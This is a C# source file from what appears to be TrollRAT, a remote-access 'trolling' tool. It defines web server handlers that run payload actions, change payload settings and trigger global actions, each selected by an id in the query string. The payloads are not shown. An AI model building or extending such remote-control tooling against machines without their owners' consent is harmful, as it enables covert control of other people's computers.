using System;
using System.Collections.Generic;
using System.Net;
using System.Text.RegularExpressions;
using System.Web;
using System.Linq;
using TrollRAT.Actions;
using TrollRAT.Payloads;
using TrollRAT.Utils;

namespace TrollRAT.Server.Commands
{
    public abstract class ActionCommandBase<t> : WebServerCommand where t : IDBase
    {
        public ActionCommandBase(WebServer server) : base(server) { }

        public abstract List<t> getActions(Payload payload);
        public abstract void doAction(HttpListenerContext context, Payload payload, t action);

        public override void execute(HttpListenerContext context)
        {
            try
            {
                int id = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("id"));

                foreach (Payload payload in server.Payloads)
                {
                    foreach (t action in getActions(payload))
                    {
                        if (action.ID == id)
                        {
                            doAction(context, payload, action);
                            return;
                        }
                    }
                }
            }
            catch (Exception ex) when (ex is FormatException || ex is OverflowException || ex is ArgumentNullException)
            {
                context.Response.StatusCode = 400;
            }
        }
    }

    public class ExecuteCommand : ActionCommandBase<PayloadAction>
    {
        public ExecuteCommand(WebServer server) : base(server) { }

        public override Regex Path => new Regex("^/execute$");

        public override List<PayloadAction> getActions(Payload payload)
        {
            return payload.Actions;
        }

        public override void doAction(HttpListenerContext context, Payload payload, PayloadAction action)
        {
            string response = action.execute();
            respondString(response, context.Response, "text/javascript");
        }
    }

    public class SetCommand : ActionCommandBase<PayloadSetting>
    {
        public SetCommand(WebServer server) : base(server) { }

        public override Regex Path => new Regex("^/set$");

        public override List<PayloadSetting> getActions(Payload payload)
        {
            return payload.Settings;
        }

        public override void doAction(HttpListenerContext context, Payload payload, PayloadSetting action)
        {
            string value = HttpUtility.ParseQueryString(context.Request.Url.Query).Get("value");

            if (value == null)
                context.Response.StatusCode = 400;
            else
            {
                action.readData(value);
            }
        }
    }

    public class GlobalActionCommand : WebServerCommand
    {
        public GlobalActionCommand(WebServer server) : base(server) { }

        public override Regex Path => new Regex("^/globalaction$");

        public override void execute(HttpListenerContext context)
        {
            try
            {
                int id = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("id"));

                foreach (GlobalActionServer action in GlobalActionServer.ServerActions)
                {
                    if (action.ID == id && action.Server == server)
                    {
                        action.execute();
                    }
                }
            }
            catch (Exception ex) when (ex is FormatException || ex is OverflowException || ex is ArgumentNullException)
            {
                context.Response.StatusCode = 400;
            }
        }
    }
}
